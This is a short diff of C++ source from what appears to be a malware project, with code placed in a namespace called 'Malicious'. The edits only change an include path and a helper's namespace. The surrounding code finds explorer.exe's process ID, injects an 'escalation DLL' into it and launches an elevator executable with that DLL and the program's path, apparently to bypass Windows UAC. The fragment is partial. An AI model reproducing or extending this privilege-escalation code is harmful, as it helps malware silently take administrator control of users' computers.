@@ -1,7 +1,7 @@
 #include "Elevator.hpp"
 #include "BinaryRessource.hpp"
 
-#include <common/Log.hpp>
+#include <log/Log.hpp>
 
 #include <system/System.hpp>
 #include <system/Uac.hpp>
@@ -42,7 +42,7 @@ namespace Malicious
 					DWORD explorer_pid = System::Process::GetPidFromName(ELEVATOR_PROCESS_NAME);
 					if(explorer_pid)
 					{
-						LOG << "Injecting escalaion DLL in explorer.exe : " + toString(explorer_pid);
+						LOG << "Injecting escalaion DLL in explorer.exe : " + Common::toString(explorer_pid);
 					}
 					else
 					{
@@ -54,7 +54,7 @@ namespace Malicious
 
                     string currentPath = thisProcess.getProgramDir();
 					
-                    string elevatorArguments = string(ELEVATOR_PROCESS_NAME) + " " + toString(explorer_pid) + " " + currentPath+"\\"+std::string(ELEVATOR_DLL_NAME) + " " + programPath;
+                    string elevatorArguments = string(ELEVATOR_PROCESS_NAME) + " " + Common::toString(explorer_pid) + " " + currentPath+"\\"+std::string(ELEVATOR_DLL_NAME) + " " + programPath;
 					LOG << "Escalation command line : " + string(ELEVATOR_EXE_NAME) + " " + elevatorArguments;
 
 					System::Process::Launcher elevatorProcess(ELEVATOR_EXE_NAME, elevatorArguments);
